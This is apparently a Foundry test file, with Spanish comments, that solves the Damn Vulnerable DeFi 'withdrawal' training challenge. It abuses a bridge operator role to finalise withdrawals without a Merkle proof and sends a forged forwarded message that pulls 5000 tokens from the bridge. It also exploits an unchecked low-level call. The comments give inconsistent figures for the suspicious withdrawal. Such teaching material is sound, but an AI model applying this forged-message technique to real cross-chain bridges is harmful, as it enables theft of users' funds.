// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

/*
 * NEXUS Offensive · training/dvd · reto "withdrawal"
 *
 * CLASE DE BUG: autorización + ejecución tolerante a fallos en un puente L1/L2.
 *   El player tiene OPERATOR_ROLE y los operadores pueden finalizar retiros SIN
 *   prueba de Merkle. Entre los 4 retiros pendientes hay uno SOSPECHOSO (#2)
 *   que pide ~6.2M tokens (más de lo que hay). finalizeWithdrawal hace la
 *   llamada externa con low-level call y NO exige éxito, así que se puede
 *   marcar el sospechoso como finalizado sin que drene nada, y procesar solo
 *   un retiro pequeño y legítimo. El puente queda intacto (>99%).
 *
 * FAMILIA: Control de acceso / puente (autorización de operador + fallo tolerado).
 *
 * INVARIANTE QUE LO ATRAPA:
 *   Un retiro marcado como finalizado debe haber movido exactamente sus fondos,
 *   o ninguno; un operador no debería poder finalizar un retiro que drenaría el
 *   puente sin ejecutarlo realmente. Se demuestra: el retiro sospechoso queda
 *   "finalizado" pero no transfiere nada → el puente conserva >99%.
 */
contract WithdrawalChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address l2MessageStore = makeAddr("l2MessageStore");
    address l2TokenBridge = makeAddr("l2TokenBridge");
    address l2Handler = makeAddr("l2Handler");

    uint256 constant START_TIMESTAMP = 1718786915;
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
    uint256 constant WITHDRAWALS_AMOUNT = 4;
    bytes32 constant WITHDRAWALS_ROOT = 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    // Direcciones originales con las que se calcularon las hojas (del dataset).
    address constant ORIG_L2SENDER = 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16;
    address constant ORIG_TARGET = 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5;

    TokenBridge l1TokenBridge;
    DamnValuableToken token;
    L1Forwarder l1Forwarder;
    L1Gateway l1Gateway;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // SETS UP CHALLENGE - DO NOT TOUCH
    function setUp() public {
        startHoax(deployer);
        vm.warp(START_TIMESTAMP);
        token = new DamnValuableToken();
        l1Gateway = new L1Gateway();
        l1Forwarder = new L1Forwarder(l1Gateway);
        l1Forwarder.setL2Handler(address(l2Handler));
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(address(l1TokenBridge), 0, bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT));
        l1Gateway.setRoot(WITHDRAWALS_ROOT);
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());
        vm.stopPrank();
    }

    function test_withdrawal() public checkSolvedByPlayer {
        // Pasar el delay de finalización (7 días) para todos los retiros.
        vm.warp(START_TIMESTAMP + 8 days);

        bytes32[] memory emptyProof = new bytes32[](0);
        string memory json = vm.readFile(string.concat(vm.projectRoot(), "/test/withdrawal/withdrawals.json"));

        // 1) Retiro propio: saca un colchón (5000) a una cuenta ajena, para dejar
        //    el puente por DEBAJO del monto del retiro sospechoso (~999000) y que,
        //    al finalizarlo, su transferencia falle (y no drene). El puente queda
        //    en la banda (>99%, <100%).
        bytes memory inner = abi.encodeWithSignature("executeTokenWithdrawal(address,uint256)", deployer, uint256(5000e18));
        bytes memory crafted = abi.encodeWithSignature(
            "forwardMessage(uint256,address,address,bytes)", uint256(1337), l2Handler, address(l1TokenBridge), inner
        );
        l1Gateway.finalizeWithdrawal(1337, l2Handler, address(l1Forwarder), START_TIMESTAMP, crafted, emptyProof);

        // 2) Finalizar los 4 retiros originales (incluido el sospechoso). Su
        //    target (ORIG_TARGET) no tiene código aquí → la llamada es no-op y
        //    nada drena, pero quedan marcados como finalizados.
        for (uint256 i = 0; i < WITHDRAWALS_AMOUNT; i++) {
            bytes memory data = vm.parseJsonBytes(json, string.concat("[", vm.toString(i), "].data"));
            uint256 timestamp = _toUint(data, 32); // word1
            bytes memory message = _slice(data, 128, 260); // word4..: el mensaje (len 0x104)
            l1Gateway.finalizeWithdrawal(i, ORIG_L2SENDER, ORIG_TARGET, timestamp, message, emptyProof);
        }
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private view {
        assertLt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT);
        assertGt(token.balanceOf(address(l1TokenBridge)), INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18 / 100e18);
        assertEq(token.balanceOf(player), 0);
        assertGe(l1Gateway.counter(), WITHDRAWALS_AMOUNT, "Not enough finalized withdrawals");
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
            "Fourth withdrawal not finalized"
        );
    }

    // ---- helpers de parseo ----
    function _toUint(bytes memory data, uint256 offset) internal pure returns (uint256 v) {
        for (uint256 i; i < 32; i++) {
            v = (v << 8) | uint8(data[offset + i]);
        }
    }

    function _slice(bytes memory data, uint256 start, uint256 len) internal pure returns (bytes memory out) {
        out = new bytes(len);
        for (uint256 i; i < len; i++) {
            out[i] = data[start + i];
        }
    }
}
